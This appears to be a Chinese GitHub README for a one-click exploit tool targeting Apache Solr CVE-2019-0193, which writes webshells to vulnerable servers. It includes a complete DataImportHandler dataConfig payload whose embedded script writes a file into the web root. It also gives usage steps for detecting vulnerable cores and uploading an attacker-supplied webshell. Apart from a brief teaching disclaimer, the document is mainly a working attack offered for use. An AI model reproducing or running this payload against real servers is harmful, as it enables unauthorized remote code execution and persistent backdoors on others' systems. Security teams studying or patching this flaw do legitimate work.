# 项目声明
只用于信息安全教学交流，请勿用于非法测试和攻击。

# ApacheSolrRCE
ApacheSolrRCE（CVE-2019-0193）一键写shell，原理是通过代码执行的java文件流写的马。

注：作者本人比较菜，如果你有bug或者有别的需求，请自行下载代码修改。


# 工具说明
由于互联网上流传的payload都是命令执行，且不方便上webshell，因此写了这段payload（回显123456时，代表写入成功）。

注：工具只能辅助测试，如果工具写不进去，建议手写。

```
<dataConfig>
<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
  <script><![CDATA[
          function poc(row){
var buf = new java.io.BufferedWriter(new java.io.FileWriter(java.net.URLDecoder.decode(java.lang.Thread.currentThread().getContextClassLoader().getResource("").getPath().toString().replaceAll("file:\/", "").split("WEB-INF")[0]+"1.txt")));buf.write(new java.lang.String(java.util.Base64.getDecoder().decode("MTIzNDU2")));buf.close();
row.put("title",123456);
return row;

}

]]></script>

<document>
    <entity
        stream="true"
        name="entity1"
        datasource="streamsrc1"
        processor="XPathEntityProcessor"
        rootEntity="true"
        forEach="/RDF/item"
        transformer="script:poc">
             <field column="title" xpath="/RDF/item/title" />
    </entity>
</document>
</dataConfig>
```
# 工具用法

<img src="https://github.com/jdr2021/ApacheSolrRCE/blob/master/1663056645344.jpg">

先点检测，获得core，并且判断有没有漏洞。

在点击getshell即可。

注：将你的webshell，放在shell目录下，工具会自动加载你的webshell至下拉列表中。

<img src="https://github.com/jdr2021/ApacheSolrRCE/blob/master/1663056948552.jpg">

默认代理是http代理，端口是8080，代码里面写死了的，需要的自己编译修改即可。

<img src="https://github.com/jdr2021/ApacheSolrRCE/blob/master/1663057045317.jpg">


# 特别感谢

[solr_exploit](https://github.com/1135/solr_exploit)
